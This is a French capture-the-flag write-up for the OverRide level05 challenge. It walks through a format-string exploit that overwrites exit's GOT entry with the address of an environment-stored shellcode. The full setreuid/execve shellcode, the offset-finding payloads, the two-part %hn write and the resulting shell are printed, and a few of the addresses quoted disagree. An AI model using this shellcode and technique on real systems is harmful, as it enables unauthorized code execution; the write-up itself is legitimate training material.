@@ -1,0 +1,41 @@
+Un programme lisant dans l'entrée standard avec un gets, puis affichant le résultat dans un printf, après y avoir appliquer une sorte
+de to_lower avec un XOR 0x20.
+Après quoi, seul un appel à exit est effectué. On pourrait faire en sorte que cet appel à exit
+fasse en fait appel a un shellcode, en réécrivrant l'adresse GOT comme on avait déjà pu faire sur rainfall,
+qu'on remplacerait par l'adresse d'une variable d'environnement ou serait stocké notre shellcode, pour éviter que le XOR modifie certaines des instructions.
+
+
+on commence par récupérer l'adresse d'exit, qu'on va devoir écraser:
+	(gdb) disas exit
+	Dump of assembler code for function exit@plt:
+		0x08048370 <+0>:     jmp    *0x80497e0 <---- GOT Adresse
+
+
+export shellcode=$(python -c 'print "\x90" * 1024 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
+	(gdb) x/20s *((char**)environ)
+	xffffdadd:      "shellcode=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220---Type <return> to continue, or q <return> to quit---
+	\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+	0xffffdba5:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\
+
+On a donc l'adresse d'exit à réecrire (0x080497e0), ainsi que l'adresse de notre variable d'envrironnement par laquelle on veut la remplacer (0xffffdedd)
+
+On cherche l'offset de notre printf :
+	level05@OverRide:~$ python -c 'print "aaaabbbb"+"%p"*15' > /tmp/exploit5
+	level05@OverRide:~$ cat /tmp/exploit5 | ./level05
+	aaaabbbb0x640xf7fcfac0(nil)(nil)(nil)(nil)0xffffffff0xffffd7340xf7fdb0000x616161610x626262620x702570250x702570250x702570250x70257025
+	level05@OverRide:~$ python -c 'print "aaaabbbb"+"%10$p"+"%11$p"' > /tmp/exploit5
+	level05@OverRide:~$ cat /tmp/exploit5 | ./level05
+	aaaabbbb0x616161610x62626262
+
+L'adresse de notre shellcode, 0xffffdedd, soit 4294958813, est trop élevé pour la width de printf, on va donc devoir le faire en deux fois
+en utilisant %hn pour écrire 2 octets, deux fois.
+
+0xffff = 65535
+0xdba5 = 56229 (-8 pour les adresses soit 56221)
+0xffff - 0xdba5 = 9306 (deuxieme partie, qui va se cumuler avec la premiere comme %n prend tous les caractères écrits auparavant)
+
+	level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56221d%10$hn" + "%9306d%11$hn"' > /tmp/exploit5
+	level05@OverRide:~$ cat /tmp/exploit5 - | ./level05
+																							-134415680
+	whoami
+	level06
